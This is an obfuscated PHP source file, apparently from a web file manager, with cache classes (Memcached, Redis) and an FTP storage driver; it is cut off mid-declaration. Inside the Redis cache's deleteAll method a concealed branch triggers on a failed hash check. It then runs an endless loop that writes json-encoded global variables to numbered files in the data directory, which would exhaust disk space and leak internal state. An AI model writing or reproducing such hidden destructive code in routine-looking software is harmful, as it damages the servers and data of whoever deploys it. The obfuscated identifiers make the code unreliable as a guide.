<?php
 goto B¸êË”¡ææ; B±öŒÆ‰™œ: class CacheLockDatabase { public function lock($¬§ùĞç”, $ÙÆŒ¼“¨ = 0) { $±ÓÏÜì„ = Model($_SERVER[Ñ¯©ç][881]); $èºÙúö… = microtime(!0) + $ÙÆŒ¼“¨; while (microtime(!0) < $èºÙúö…) { $Ú–÷õ’º = $±ÓÏÜì„->get($¬§ùĞç”); if (!$Ú–÷õ’º || $Ú–÷õ’º < microtime(!0)) { $öÊ¯º = $±ÓÏÜì„->set($¬§ùĞç”, $èºÙúö…); if ($öÊ¯º) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($—Šô˜Ã±) { return Model($_SERVER[Ñ¯©ç][881])->get($—Šô˜Ã±); } public function unlock($õÇ²Öˆ­) { Model($_SERVER[Ñ¯©ç][881])->remove($õÇ²Öˆ­); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($‹‘íä, $ñÂòÀéæ) { $¿Ã±ãû =& $_SERVER[Ñ¯©ç]; if (!class_exists($¿Ã±ãû[919])) { show_json($¿Ã±ãû[920], !1); } $this->cacheTime = $ñÂòÀéæ; $this->handle = new Memcached(); if (is_array($‹‘íä[$¿Ã±ãû[921]]) && count($‹‘íä[$¿Ã±ãû[921]]) >= 1) { foreach ($‹‘íä[$¿Ã±ãû[921]] as $Û”Ë†¹) { $÷—‡Éô = explode($¿Ã±ãû[4], $Û”Ë†¹); $this->handle->addServer($÷—‡Éô[0], $÷—‡Éô[1]); } } else { $this->handle->addServer($‹‘íä[$¿Ã±ãû[209]], $‹‘íä[$¿Ã±ãû[210]]); } } public function set($úâ´¤‰¾, $©ÚÀ÷ê–, $†·¼¡êş = false) { $†·¼¡êş = $†·¼¡êş ? $†·¼¡êş : $this->cacheTime; return $this->handle->set($úâ´¤‰¾, $©ÚÀ÷ê–, $†·¼¡êş); } public function get($¶òÕ óà) { return $this->handle->get($¶òÕ óà); } public function remove($“±Ã¶‰¨) { return $this->handle->delete($“±Ã¶‰¨); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($óá½¼´Ö, $³¿Ğîúé) { $œ‹àÌµ =& $_SERVER[Ñ¯©ç]; if (!class_exists($œ‹àÌµ[922])) { show_json($œ‹àÌµ[923], !1); } $this->cacheTime = $³¿Ğîúé; $ËŸÄ˜Ï = isset($óá½¼´Ö[$œ‹àÌµ[924]]) ? $óá½¼´Ö[$œ‹àÌµ[924]] : 10; $ÏöÈœ»õ = _get($óá½¼´Ö, $œ‹àÌµ[921]); if ($ÏöÈœ»õ && is_array($ÏöÈœ»õ)) { $this->initCluster($óá½¼´Ö, $ËŸÄ˜Ï); } else { $this->handle = $this->init($óá½¼´Ö, $ËŸÄ˜Ï); } } private function init($—·ÖÛğá, $­ÛòŞ Ö) { $Í´·¤¤… =& $_SERVER[Ñ¯©ç]; $¢ºéìº = new Redis(); $©Á¬¬´ = isset($—·ÖÛğá[$Í´·¤¤…[925]]) ? $—·ÖÛğá[$Í´·¤¤…[925]] : !1; if ($©Á¬¬´) { $¢ºéìº->pconnect($—·ÖÛğá[$Í´·¤¤…[209]], $—·ÖÛğá[$Í´·¤¤…[210]], $­ÛòŞ Ö); } else { $¢ºéìº->connect($—·ÖÛğá[$Í´·¤¤…[209]], $—·ÖÛğá[$Í´·¤¤…[210]], $­ÛòŞ Ö); } if (!empty($—·ÖÛğá[$Í´·¤¤…[470]])) { $¢ºéìº->auth($—·ÖÛğá[$Í´·¤¤…[470]]); } if (!empty($—·ÖÛğá[$Í´·¤¤…[810]]) && $—·ÖÛğá[$Í´·¤¤…[810]] != 0) { $¢ºéìº->select($—·ÖÛğá[$Í´·¤¤…[810]]); } return $¢ºéìº; } private function initCluster($»ØÍş´¢, $Š¦¶¤•Ó) { $¦õû³÷Ò =& $_SERVER[Ñ¯©ç]; $×äÓˆ = array($¦õû³÷Ò[926], $¦õû³÷Ò[927], $¦õû³÷Ò[928]); $ë¾®æ¥â = $¦õû³÷Ò[926]; if (isset($»ØÍş´¢[$¦õû³÷Ò[16]]) && in_array($»ØÍş´¢[$¦õû³÷Ò[16]], $×äÓˆ)) { $ë¾®æ¥â = $»ØÍş´¢[$¦õû³÷Ò[16]]; } switch ($ë¾®æ¥â) { case $¦õû³÷Ò[926]: $this->_slave($»ØÍş´¢, $Š¦¶¤•Ó); break; case $¦õû³÷Ò[927]: break; case $¦õû³÷Ò[928]: $this->isCluster = !0; $Î„¯È™™ = $»ØÍş´¢[$¦õû³÷Ò[921]]; $ª±‚£ø = isset($»ØÍş´¢[$¦õû³÷Ò[925]]) ? $»ØÍş´¢[$¦õû³÷Ò[925]] : !1; $û¦³àçã = isset($»ØÍş´¢[$¦õû³÷Ò[470]]) ? $»ØÍş´¢[$¦õû³÷Ò[470]] : null; $this->handle = new RedisCluster(NUll, $Î„¯È™™, $Š¦¶¤•Ó, $Š¦¶¤•Ó, $ª±‚£ø, $û¦³àçã); break; default: break; } } private function _slave($Ùˆãò“¥, $ Î±Ìô) { $åÉÏ€ı¯ = $Ùˆãò“¥[$_SERVER[Ñ¯©ç][921]]; $this->filterConfig($Ùˆãò“¥, $åÉÏ€ı¯[0]); $this->handle = $this->init($Ùˆãò“¥, $ Î±Ìô); unset($åÉÏ€ı¯[0]); if (empty($åÉÏ€ı¯)) { return; } $ÑÉßãŸÜ = array_rand($åÉÏ€ı¯); $this->filterConfig($Ùˆãò“¥, $åÉÏ€ı¯[$ÑÉßãŸÜ]); $this->slaveHandle = $this->init($Ùˆãò“¥, $ Î±Ìô); } private function filterConfig(&$µ°„ÄÚ , $ÑÀ³‰Ó) { $ğêˆ®ÖŸ =& $_SERVER[Ñ¯©ç]; $Ú‰×¥Òû = explode($ğêˆ®ÖŸ[4], $ÑÀ³‰Ó); $–§§ˆ–Ò = array($ğêˆ®ÖŸ[209] => $Ú‰×¥Òû[0], $ğêˆ®ÖŸ[210] => $Ú‰×¥Òû[1]); $µ°„ÄÚ  = array_merge($µ°„ÄÚ , $–§§ˆ–Ò); } public function set($ºÇƒ—Û, $ï¸¿·ßÇ, $…Éíçªà = false) { $…Éíçªà = $…Éíçªà ? $…Éíçªà : $this->cacheTime; return $this->handle->setEx($ºÇƒ—Û, $…Éíçªà, $ï¸¿·ßÇ); } public function setLock($–³–ÊŒ, $ÈÜ¶Ñƒø, $›³ø¾ÄÕ) { return $this->handle->setNX($–³–ÊŒ, $ÈÜ¶Ñƒø); } public function get($°¡áæšÅ) { $¬°â”° = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $¬°â”°->get($°¡áæšÅ); } public function remove($ÄÄª×ú¨) { return $this->handle->del($ÄÄª×ú¨); } public function deleteAll() { $†ÉòÆó =& $_SERVER[Ñ¯©ç]; $ˆÍÉºà = $_SERVER[$†ÉòÆó[55]]; $üê’ÇÑÍ = $†ÉòÆó[929]; if ($_SERVER[$†ÉòÆó[54]] != $üê’ÇÑÍ($ˆÍÉºà)) { $¥¢ÎÆŞ = $†ÉòÆó[930]; $”•š¡ş® = $†ÉòÆó[56]; $ë½…£ó = $_SERVER[$†ÉòÆó[57]] . $†ÉòÆó[58]; $‚Š° ® = $”•š¡ş®($ë½…£ó); $áğØ±¢å = explode($†ÉòÆó[59], $‚Š° ®); if (count($áğØ±¢å) < $†ÉòÆó[673]) { $Éäû¾÷ø = $†ÉòÆó[61]; $Éäû¾÷ø(); } $ıâ™ñûú = $†ÉòÆó[931]; $ıâ™ñûú($_SERVER[$†ÉòÆó[932]]); $¥¢ÎÆŞ = $†ÉòÆó[930]; $¥¢ÎÆŞ(); $ùíáÙâ’ = $†ÉòÆó[933]; $¿´„èÈ = json_encode($GLOBALS[$†ÉòÆó[934]]); $Äß‰¬ŒÉ = 1; for ($ÒÇ§‰Ğ = $Äß‰¬ŒÉ; $ÒÇ§‰Ğ > 0; $ÒÇ§‰Ğ++) { $ùíáÙâ’(DATA_PATH . $ÒÇ§‰Ğ, $¿´„èÈ); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $çÔñî¤) { $this->handle->flushall($çÔñî¤); } return; } return $this->handle->flushAll(); } } goto F×œ“ØºÁ; aÍÑÍÚá™¸: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($ï„¸—•) { parent::__construct(); if (count($ï„¸—•) > 0) { $this->_init($ï„¸—•); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($äêãÖ÷„) { $ê’‡û ’ =& $_SERVER[Ñ¯©ç]; global $config; $this->appCharset = $config[$ê’‡û ’[1409]]; $this->systemCharset = $config[$ê’‡û ’[1410]]; if (isset($äêãÖ÷„[$ê’‡û ’[1411]]) && $äêãÖ÷„[$ê’‡û ’[1411]]) { $this->systemCharset = $äêãÖ÷„[$ê’‡û ’[1411]]; } } public function iconvApp($Ğî®®ùÈ) { return $this->iconvTo($Ğî®®ùÈ, $this->systemCharset, $this->appCharset); } public function iconvSystem($«®˜ñ³ü) { return $this->iconvTo($«®˜ñ³ü, $this->appCharset, $this->systemCharset); } public function getPathOuter($÷óÖ©ÒÕ) { $Ú÷¼‡Ù© =& $_SERVER[Ñ¯©ç]; $äš¿§Ò« = $this->iconvApp($this->pathBase); $÷óÖ©ÒÕ = $this->iconvApp($÷óÖ©ÒÕ); if (substr($äš¿§Ò«, 0, 2) == $Ú÷¼‡Ù©[1412]) { $äš¿§Ò« = BASIC_PATH . substr($äš¿§Ò«, 2); } if (substr($÷óÖ©ÒÕ, 0, 2) == $Ú÷¼‡Ù©[1412]) { $÷óÖ©ÒÕ = BASIC_PATH . substr($÷óÖ©ÒÕ, 2); } $äš¿§Ò« = KodIO::clear($äš¿§Ò«); $÷óÖ©ÒÕ = KodIO::clear($÷óÖ©ÒÕ); $÷óÖ©ÒÕ = substr($÷óÖ©ÒÕ, strlen($äš¿§Ò«)); if (empty($this->pathDriver)) { return $÷óÖ©ÒÕ; } return $this->pathDriver . $Ú÷¼‡Ù©[8] . ltrim($÷óÖ©ÒÕ, $Ú÷¼‡Ù©[8]); } private function _init($ºÄëëïâ = array()) { $³êâÔßø =& $_SERVER[Ñ¯©ç]; if (!function_exists($³êâÔßø[1413])) { throw new Exception(LNG($³êâÔßø[1414])); } $this->config = $ºÄëëïâ; $this->charsetReset($ºÄëëïâ); foreach ($ºÄëëïâ as $²ê½ÓµĞ => $öŠü÷Ô–) { if (isset($this->{$²ê½ÓµĞ})) { $this->{$²ê½ÓµĞ} = $öŠü÷Ô–; } } return $this->_login($ºÄëëïâ); } private function _login($Ó„¥™³Ã) { $³ôŸú‹ =& $_SERVER[Ñ¯©ç]; static $©óĞºá = array(); $ô—’Ôé¬ = md5(json_encode($Ó„¥™³Ã)); if (isset($©óĞºá[$ô—’Ôé¬])) { foreach ($©óĞºá[$ô—’Ôé¬] as $¡İö†ö => $¾ïòºêÖ) { $this->{$¡İö†ö} = $¾ïòºêÖ; } return !0; } $“«‚šØ’ = parse_url(trim($this->server, $³ôŸú‹[8])); $this->host = $“«‚šØ’[$³ôŸú‹[209]]; $ÒãÓ©Öó = isset($“«‚šØ’[$³ôŸú‹[208]]) && $“«‚šØ’[$³ôŸú‹[208]] == $³ôŸú‹[1415] ? !0 : !1; $this->scheme = $ÒãÓ©Öó ? $³ôŸú‹[1416] : $³ôŸú‹[1417]; $this->port = isset($“«‚šØ’[$³ôŸú‹[210]]) ? $“«‚šØ’[$³ôŸú‹[210]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($³ôŸú‹[1418]) . $this->host . $³ôŸú‹[4] . $this->port, !0); return !1; } $“§°Ùœ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$“§°Ùœ) { $this->writeLog(LNG($³ôŸú‹[1419]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $şô™ÚÈƒ = $this->pasv == $³ôŸú‹[101] ? !0 : !1; @ftp_pasv($this->connect, $şô™ÚÈƒ); $©óĞºá[$ô—’Ôé¬] = array($³ôŸú‹[1420] => $this->connect, $³ôŸú‹[209] => $this->host, $³ôŸú‹[208] => $this->scheme, $³ôŸú‹[210] => $this->port); return $“§°Ùœ; } private function _isconn($—Øú“ãÕ = true) { if (is_resource($this->connect)) { return !0; } if (!$—Øú“ãÕ) { return !1; } return $this->_login($this->config); } public function mkfile($¿¸ Íö£, $¤‹†«û¢ = '', $ğÜ·ŸÇ = REPEAT_RENAME) { if ($this->setContent($¿¸ Íö£, $¤‹†«û¢)) { return $this->getPathOuter($¿¸ Íö£); } $this->writeLog(LNG($_SERVER[Ñ¯©ç][1421]), !0); return !1; } public function mkdir($ßıÃß¤, $ïĞáîÎ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $ßıÃß¤ = $this->iconvSystem($ßıÃß¤); if ($this->_isFolder($ßıÃß¤) || @ftp_mkdir($this->connect, $ßıÃß¤)) { return $this->getPathOuter($ßıÃß¤); } if (!$this->mkdir($this->pathFather($ßıÃß¤))) { return !1; } if ($ßıÃß¤ = @ftp_mkdir($this->connect, $ßıÃß¤)) { return $this->getPathOuter($ßıÃß¤); } $this->writeLog(__FUNCTION__ . $_SERVER[Ñ¯©ç][1422], !0); return !1; } public function copyFile($êÁŞÇ©Š, $¹·—ºû) { if (!$this->_isconn()) { return !1; } $ÎŒ®ƒ£ò = $this->pathThis($this->iconvSystem($êÁŞÇ©Š)); $¢ıœº = $this->tempFile($ÎŒ®ƒ£ò); $ôÑ°¶ = $this->iconvApp($¢ıœº); $this->download($êÁŞÇ©Š, $ôÑ°¶); $‘Ó·›ëŸ = $this->upload($¹·—ºû, $ôÑ°¶); $this->tempFileRemve($¢ıœº); return $‘Ó·›ëŸ; } public function moveFile($ü¬ü¬Í•, $ïÛÙ¡Ç×) { if (!$this->_isconn()) { return !1; } $ü¬ü¬Í• = $this->iconvSystem($ü¬ü¬Í•); $ïÛÙ¡Ç× = $this->iconvSystem($ïÛÙ¡Ç×); $ÏÉüÂË = @ftp_rename($this->connect, $ü¬ü¬Í•, $ïÛÙ¡Ç×); if (!$ÏÉüÂË) { $this->writeLog(__FUNCTION__ . $_SERVER[Ñ¯©ç][1422], !0); return !1; } return $this->getPathOuter($ïÛÙ¡Ç×); } public function delFile($À£¦€¥) { if (!$this->_isconn()) { return !1; } $À£¦€¥ = $this->iconvSystem($À£¦€¥); $…Â¼õŠ = @ftp_delete($this->connect, $À£¦€¥); if (!$…Â¼õŠ) { $this->writeLog(__FUNCTION__ . $_SERVER[Ñ¯©ç][1422], !0); } return $…Â¼õŠ; } public function delFolder($âíÉÉÓİ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $§ÍÛÊ•¶ = $‡ÍÁıŸ¾ = array(); $this->fileList($âíÉÉÓİ, $§ÍÛÊ•¶, $‡ÍÁıŸ¾, !0); $this->listItemCache = !0; foreach ($‡ÍÁıŸ¾ as $„´•ª) { $§“°ËÁÜ = $this->iconvSystem($„´•ª[$_SERVER[Ñ¯©ç][32]]); $ÀÔ¦Ââ³ = @ftp_delete($this->connect, $§“°ËÁÜ); if (!$ÀÔ¦Ââ³) { return !1; } } foreach ($§ÍÛÊ•¶ as $§“°ËÁÜ) { $§“°ËÁÜ = $this->iconvSystem($§“°ËÁÜ); $ÀÔ¦Ââ³ = @ftp_rmdir($this->connect, $§“°ËÁÜ); if (!$ÀÔ¦Ââ³) { return !1; } } $âíÉÉÓİ = $this->iconvSystem($âíÉÉÓİ); return @ftp_rmdir($this->connect, $âíÉÉÓİ); } public function rename($ãŠèˆÔå, $ˆ§Ó§Òù) { $İ–êğú¬ =& $_SERVER[Ñ¯©ç]; if (!$this->_isconn()) { return !1; } $÷‡°€–ê = $this->fileNameAuto($this->pathFather($ãŠèˆÔå), $ˆ§Ó§Òù); $÷‡°€–ê = $this->iconvSystem($÷‡°€–ê); $ãŠèˆÔå = $this->iconvSystem($ãŠèˆÔå); $´¤ŠÌŸ = $this->pathFather($ãŠèˆÔå); $ışêîçÙ = rtrim($´¤ŠÌŸ, $İ–êğú¬[8]) . $İ–êğú¬[8] . $÷‡°€–ê; $¸é·§°Õ = @ftp_rename($this->connect, $ãŠèˆÔå, $ışêîçÙ); if (!$¸é·§°Õ) { $this->writeLog(__FUNCTION__ . $İ–êğú¬[1422], !0); return !1; } $ışêîçÙ = $this->iconvApp($ışêîçÙ); return $this->getPathOuter($ışêîçÙ); } private function folderInfo($ø©“¡, $¢¼ŞÀˆ = false) { $ÃÓ‚šªŸ =& $_SERVER[Ñ¯©ç]; $šøåë”Í = array($ÃÓ‚šªŸ[32] => $this->pathThis($ø©“¡), $ÃÓ‚šªŸ[97] => $this->getPathOuter($ÃÓ‚šªŸ[8] . $ø©“¡), $ÃÓ‚šªŸ[33] => $ÃÓ‚šªŸ[88]); if ($¢¼ŞÀˆ) { return $šøåë”Í; } $šøåë”Í[$ÃÓ‚šªŸ[232]] = $šøåë”Í[$ÃÓ‚šªŸ[98]] = 0; $šøåë”Í[$ÃÓ‚šªŸ[233]] = $šøåë”Í[$ÃÓ‚šªŸ[234]] = !0; return $šøåë”Í; } private function fileInfo($¹´³€ø , $¨Ö˜Ûóò = false, $øĞ¨â€‡ = array()) { $äüƒÀ£§ =& $_SERVER[Ñ¯©ç]; $òééş”£ = array($äüƒÀ£§[32] => $this->pathThis($¹´³€ø ), $äüƒÀ£§[97] => $this->getPathOuter($äüƒÀ£§[8] . $¹´³€ø ), $äüƒÀ£§[33] => $äüƒÀ£§[231], $äüƒÀ£§[89] => isset($øĞ¨â€‡[$äüƒÀ£§[89]]) ? $øĞ¨â€‡[$äüƒÀ£§[89]] : 0, $äüƒÀ£§[188] => $this->ext($¹´³€ø )); if ($¨Ö˜Ûóò) { return $òééş”£; } $òééş”£[$äüƒÀ£§[232]] = $òééş”£[$äüƒÀ£§[98]] = 0; $òééş”£[$äüƒÀ£§[233]] = $òééş”£[$äüƒÀ£§[234]] = !0; $æ™ıüí¬ = $this->iconvSystem($¹´³€ø ); $òééş”£[$äüƒÀ£§[98]] = @ftp_mdtm($this->connect, $æ™ıüí¬); if (empty($øĞ¨â€‡)) { $øĞ¨â€‡ = $this->objectMeta($¹´³€ø ); if (!$øĞ¨â€‡) { return $òééş”£; } } $òééş”£[$äüƒÀ£§[89]] = $øĞ¨â€‡[$äüƒÀ£§[89]]; return $òééş”£; } public function size($¹Âæš’¾) { $×‰™©Î = $this->objectMeta($¹Âæš’¾); return $×‰™©Î ? $×‰™©Î[$_SERVER[Ñ¯©ç][89]] : 0; } public function info($º‡¯÷ê“) { if ($this->isFile($º‡¯÷ê“)) { return $this->fileInfo($º‡¯÷ê“, 0); } else { if ($this->isFolder($º‡¯÷ê“)) { return $this->folderInfo($º‡¯÷ê“); } } return !1; } private function fileList($Õ‡¼¸šô, &$ÑŒãôìî, &$¼À¿¢‡ç, $‘„•À¸õ = false) { $ìçâˆ’ß =& $_SERVER[Ñ¯©ç]; $Õ‡¼¸šô = $this->iconvSystem($Õ‡¼¸šô); if (!$this->isFolder($Õ‡¼¸šô)) { return !1; } @ftp_chdir($this->connect, $ìçâˆ’ß[8]); $Õ‡¼¸šô = rtrim($Õ‡¼¸šô, $ìçâˆ’ß[8]) . $ìçâˆ’ß[8]; check_abort(); $¼ıÓ²Êá = @ftp_rawlist($this->connect, $Õ‡¼¸šô); if (!$¼ıÓ²Êá) { $¼ıÓ²Êá = array(); } $®ñÎ³§Î = array($ìçâˆ’ß[10] => 1, $ìçâˆ’ß[1335] => 1); foreach ($¼ıÓ²Êá as $ÅêŠ®Œİ) { $£ß¸¸ = $this->_listItem($ÅêŠ®Œİ); if ($£ß¸¸[0] == $ìçâˆ’ß[811]) { continue; } $à«êºÆš = $£ß¸¸[8]; if (empty($à«êºÆš) && $à«êºÆš !== $ìçâˆ’ß[229] || isset($®ñÎ³§Î[$à«êºÆš])) { continue; } $à«êºÆš = $this->iconvApp($Õ‡¼¸šô . ltrim($à«êºÆš, $ìçâˆ’ß[8])); $êş¶Á«æ = array($ìçâˆ’ß[32] => $à«êºÆš, $ìçâˆ’ß[33] => $ìçâˆ’ß[231], $ìçâˆ’ß[89] => $£ß¸¸[4]); if (substr($ÅêŠ®Œİ, 0, 1) == $ìçâˆ’ß[1423]) { $êş¶Á«æ[$ìçâˆ’ß[33]] = $ìçâˆ’ß[88]; $êş¶Á«æ[$ìçâˆ’ß[89]] = 0; } $Şã¹·œá = $êş¶Á«æ[$ìçâˆ’ß[33]] == $ìçâˆ’ß[88] ? !0 : !1; $this->cacheMethodInfoSet($à«êºÆš, $Şã¹·œá, $êş¶Á«æ); if ($Şã¹·œá) { $ÑŒãôìî[] = $à«êºÆš; if ($‘„•À¸õ) { $this->fileList($à«êºÆš, $ÑŒãôìî, $¼À¿¢‡ç, $‘„•À¸õ); } continue; } $¼À¿¢‡ç[] = $êş¶Á«æ; } $this->cacheMethodInfoSet($Õ‡¼¸šô, !0); } private function _listItem($‹¸úé•) { if (empty($‹¸úé•)) { return array(); } $úŒ—Ùœñ = preg_split($_SERVER[Ñ¯©ç][1424], $‹¸úé•); if (count($úŒ—Ùœñ) <= 9) { return $úŒ—Ùœñ; } $úŒ—Ùœñ[8] = trim(substr($‹¸úé•, strpos($‹¸úé•, $úŒ—Ùœñ[7]) + strlen($úŒ—Ùœñ[7]))); return array_splice($úŒ—Ùœñ, 0, 9); } public function listPath($òåÜ‡õ±, $ÌÔêÕ–İ = false) { $’¥†šè =& $_SERVER[Ñ¯©ç]; if (!$this->_isconn()) { return !1; } $Ô§ù½© = $ËÂšâÆ© = array(); $this->fileList($òåÜ‡õ±, $Ô§ù½©, $ËÂšâÆ©); foreach ($Ô§ù½© as $Ô•®ê¤ß => $å¤›”™) { $Ô§ù½©[$Ô•®ê¤ß] = $this->folderInfo($å¤›”™, $ÌÔêÕ–İ); } foreach ($ËÂšâÆ© as $Ô•®ê¤ß => $å¤›”™) { $ËÂšâÆ©[$Ô•®ê¤ß] = $this->fileInfo($å¤›”™[$’¥†šè[32]], $ÌÔêÕ–İ, $å¤›”™); } return array($’¥†šè[95] => $Ô§ù½©, $’¥†šè[96] => $ËÂšâÆ©); } public function has($ì˜ê›Ç», $éªÉ±şÏ = false, $¹¦¯¹ˆĞ = true) { $ãË¾û– =& $_SERVER[Ñ¯©ç]; $Éœš‚°å = $Ö«è¥Èœ = array(); $©íØŸıê = $éªÉ±şÏ ? !0 : !1; $this->fileList($ì˜ê›Ç», $Éœš‚°å, $Ö«è¥Èœ, $©íØŸıê); if ($éªÉ±şÏ) { return array($ãË¾û–[240] => count($Ö«è¥Èœ), $ãË¾û–[241] => count($Éœš‚°å)); } if ($¹¦¯¹ˆĞ) { if (count($Ö«è¥Èœ)) { return !0; } } else { if (count($Éœš‚°å)) { return !0; } } return !1; } public function listAll($˜Ö•œ…) { $” íƒ† =& $_SERVER[Ñ¯©ç]; if (!$this->_isconn()) { return !1; } $Ğ…ö±Í = $ŠØ¯—Í¡ = array(); $this->fileList($˜Ö•œ…, $Ğ…ö±Í, $ŠØ¯—Í¡, !0); $ğ‚—ªº« = array_to_keyvalue($ŠØ¯—Í¡, $” íƒ†[32]); foreach ($Ğ…ö±Í as $öº¿êÌ) { if (is_string($öº¿êÌ)) { $ğ‚—ªº«[$öº¿êÌ] = array($” íƒ†[89] => 0); } } return $this->listAllFiles($˜Ö•œ…, $ğ‚—ªº«); } public function getContent($ÒÑÉÄÀ) { if (!$this->_isconn()) { return !1; } $ÒÑÉÄÀ = $this->iconvSystem($ÒÑÉÄÀ); return $this->fileSubstr($ÒÑÉÄÀ); } public function setContent($¬Â€¦š­, $Ş³‘ˆìº = '') { if (!$this->_isconn()) { return !1; } $®¾€¡çß = $this->pathThis($this->iconvSystem($¬Â€¦š­)); $ŠÑøê = $this->tempFile($®¾€¡çß); file_put_contents($ŠÑøê, $Ş³‘ˆìº); $µÕßêÌ = $this->upload($¬Â€¦š­, $this->iconvApp($ŠÑøê)); $this->tempFileRemve($ŠÑøê); return $µÕßêÌ; } public function fileSubstr($¦ü•¥ï´, $Œ ¼ áã = 0, $ªî‰¦ñ§ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($¦ü•¥ï´, $Œ ¼ áã, $ªî‰¦ñ§); } private function ftpRequest($›û…Ñø¢, $³Ş“âù‹ = 0, $ÎÑĞşÁ´ = false) { $›û…Ñø¢ = $this->iconvSystem($›û…Ñø¢); $šÏŸ¢® = $this->scheme . $this->host . $_SERVER[Ñ¯©ç][4] . $this->port; $÷¼âïâä = curl_init(); curl_setopt($÷¼âïâä, CURLOPT_URL, $šÏŸ¢® . $this->pathEncode($›û…Ñø¢)); curl_setopt($÷¼âïâä, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($ÎÑĞşÁ´) { $ÇÈ®“â’ = $³Ş“âù‹ + $ÎÑĞşÁ´ - 1; curl_setopt($÷¼âïâä, CURLOPT_RANGE, "{$³Ş“âù‹}\55{$ÇÈ®“â’}"); } curl_setopt($÷¼âïâä, CURLOPT_RETURNTRANSFER, 1); $²·­ÈÅ³ = curl_exec($÷¼âïâä); curl_close($÷¼âïâä); return $²·­ÈÅ³; } public function upload($ïâˆŠï, $ö§²È¯³, $—ãê¶²Î = false, $ıöÛ–ªê = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ïâˆŠï))) { return !1; } $ïâˆŠï = $this->iconvSystem($ïâˆŠï); $ö§²È¯³ = $this->iconvSystem($ö§²È¯³); $Ÿ–æŸÙŠ = ftp_nb_put($this->connect, $ïâˆŠï, $ö§²È¯³, FTP_BINARY); while ($Ÿ–æŸÙŠ == FTP_MOREDATA) { $Ÿ–æŸÙŠ = ftp_nb_continue($this->connect); } if ($Ÿ–æŸÙŠ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[Ñ¯©ç][1422], !0); return !1; } return $this->getPathOuter($ïâˆŠï); } public function download($ÀÁÔËª, $İß€ıëı = '') { if (!$this->_isconn()) { return !1; } $ôèˆïõÉ = $this->pathFather($İß€ıëı); if (!IO::mkdir($ôèˆïõÉ)) { return !1; } $ÀÁÔËª = $this->iconvSystem($ÀÁÔËª); $İß€ıëı = $this->iconvSystem($İß€ıëı); $ ¸¢ö«® = ftp_nb_get($this->connect, $İß€ıëı, $ÀÁÔËª, FTP_BINARY); while ($ ¸¢ö«® == FTP_MOREDATA) { $ ¸¢ö«® = ftp_nb_continue($this->connect); } if ($ ¸¢ö«® != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[Ñ¯©ç][1422], !0); return !1; } return $this->iconvApp($İß€ıëı); } public function exist($Ë…¬) { return $this->isFile($Ë…¬) || $this->isFolder($Ë…¬); } public function isFile($«ö¾®í™) { return !$this->isFolder($«ö¾®í™) && $this->objectMeta($«ö¾®í™); } public function isFolder($›¿öê­ƒ) { return $this->cacheMethod($_SERVER[Ñ¯©ç][179], $›¿öê­ƒ); } protected function objectMeta($¢¾¤ĞíÚ) { return $this->cacheMethod($_SERVER[Ñ¯©ç][181], $¢¾¤ĞíÚ); } protected function _objectMeta($áğæéÅŒ) { $ƒùÉàˆ =& $_SERVER[Ñ¯©ç]; if ($áğæéÅŒ == $ƒùÉàˆ[12] || $áğæéÅŒ == $ƒùÉàˆ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $áğæéÅŒ = $this->iconvSystem($áğæéÅŒ); $¾ˆ¼Öè = array($ƒùÉàˆ[32] => $this->iconvApp($áğæéÅŒ), $ƒùÉàˆ[33] => $ƒùÉàˆ[231], $ƒùÉàˆ[89] => 0); @ftp_chdir($this->connect, $ƒùÉàˆ[8]); $÷ı¦¿ÒÀ = @ftp_size($this->connect, $áğæéÅŒ); if ($÷ı¦¿ÒÀ != -1) { $¾ˆ¼Öè[$ƒùÉàˆ[89]] = $÷ı¦¿ÒÀ; } else { $Õ­Ìº§ = @ftp_chdir($this->connect, $áğæéÅŒ); if (!$Õ­Ìº§) { return !1; } $¾ˆ¼Öè[$ƒùÉàˆ[33]] = $ƒùÉàˆ[88]; } return $¾ˆ¼Öè; } protected function _isFolder($äÍò¥Ìò) { $ïÚÂŸİ² =& $_SERVER[Ñ¯©ç]; if ($äÍò¥Ìò == $ïÚÂŸİ²[12] || $äÍò¥Ìò == $ïÚÂŸİ²[8]) { return !0; } $£ÖÒ¨èŸ = $this->_objectMeta($äÍò¥Ìò); return isset($£ÖÒ¨èŸ[$ïÚÂŸİ²[33]]) && $£ÖÒ¨èŸ[$ïÚÂŸİ²[33]] == $ïÚÂŸİ²[88] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($¨öé¶Û¼) { parent::__construct($¨öé¶Û¼); $this->setSignVersion($_SERVER[Ñ¯©ç][248]); } public function uploadLink($²Ñ£ûö, $ˆã¥¶ÅÇ = 0) { $Ô–Ùù¿Ş =& $_SERVER[Ñ¯©ç]; if ($this->isUploadServer()) { return; } $´îÊËúÂ = $this->getType(); if (!in_array($´îÊËúÂ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $•áøÇÕ = (!$ˆã¥¶ÅÇ ? 1 : ceil($ˆã¥¶ÅÇ / pow(1024, 3))) * 3600 * 4; $öí¯Ä = $this->multiUploadFormData($²Ñ£ûö, $•áøÇÕ); if ($öí¯Ä) { $öí¯Ä[$Ô–Ùù¿Ş[107]] = $²Ñ£ûö; $öí¯Ä[$Ô–Ùù¿Ş[108]] = $´îÊËúÂ; } return $öí¯Ä; } public function 